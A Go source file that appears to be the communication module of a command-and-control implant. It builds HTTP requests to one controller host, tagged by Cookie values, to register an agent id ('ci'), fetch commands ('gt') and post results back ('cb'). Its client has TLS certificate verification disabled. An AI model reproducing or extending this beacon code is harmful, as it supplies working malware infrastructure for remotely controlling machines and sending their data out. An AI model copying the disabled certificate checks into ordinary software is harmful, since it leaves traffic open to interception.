package internal

import (
	"bytes"
	"crypto/tls"
	"net/http"
	"net/url"
)

type Link struct {
	Id   string
	Host string
	Key  []byte
}

var HttpLink Link
var client = &http.Client{
	Transport: &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	},
}

func (l *Link) NewResultRequest(data []byte) (*http.Request, error) {
	u, err := url.Parse(l.Host)
	if err != nil {
		return nil, err
	}
	body := bytes.NewReader(data)
	req, err := http.NewRequest("POST", u.String(), body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", "cb")
	req.Header.Set("User-Agent", l.Id)
	return req, nil
}

func (l *Link) NewIdRequest() (*http.Request, error) {
	u, err := url.Parse(l.Host)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", "ci")
	return req, nil
}

func (l *Link) NewCmdRequest() (*http.Request, error) {
	u, err := url.Parse(l.Host)
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Cookie", "gt")
	req.Header.Set("User-Agent", l.Id)
	return req, nil
}

func SendRequest(req *http.Request) (*http.Response, error) {
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	return resp, nil
}
